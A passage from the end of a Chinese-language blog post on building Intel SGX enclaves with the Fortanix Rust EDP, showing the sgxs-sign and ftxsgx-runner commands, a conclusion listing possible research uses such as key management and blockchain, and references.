enclave using sgxs-sign sgxs-sign --key my_key.pem myapp.sgxs myapp.sig -d --xfrm 7/0 --isvprodid 0 --isvsvn 0 Run 每個 encalve 都需要一個 runner 去執行它，預設使用 ftxsgx-runner。\n1 ftxsgx-runner myapp.sgxs 簽名放在與 .sgxs 同個資料夾即可，若無也會生成假的簽名。\nConclusion 還是有很多細節還沒看，還有也還沒探討到爆出的一些漏洞、安全性問題。 將研究加入 Intel SGX 是有很多種可能性的:\n私鑰管理：使用 enclave 管理私鑰 與區塊鏈結合：提高區塊鏈應用的安全性 電子硬體錢包：在更安全的環境中執行虛擬貨幣交易 多方計算(Multiparty computation) IoT：提升通訊安全 Reference Fortanix Rust Enclave Development Platform (github) Fortanix Rust Enclave Development Platform | Rust EDP Intel® Software Guard Extensions Overview of Intel SGX ","date":"2021-08-05T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/%E4%BD%BF%E7%94%A8-rust-edp-%E6%92%B0%E5%AF%AB-intel-sgx-%E7%A8%8B%E5%BC%8F/","title":"使用 Rust EDP 撰寫 Intel SGX 程式"}]